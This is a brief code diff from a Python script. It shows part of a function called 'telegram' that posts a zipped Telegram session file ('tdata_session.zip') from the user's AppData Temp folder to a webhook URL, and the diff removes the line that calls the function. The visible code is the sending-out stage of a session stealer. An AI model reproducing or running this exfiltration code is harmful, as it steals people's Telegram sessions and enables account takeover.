@@ -19,4 +19,3 @@ def telegram():
         'file': (user+'\\AppData\\Local\\Temp\\tdata_session.zip', f, 'zip')
      }    
      r = requests.post(hook, files=payload)
-telegram()
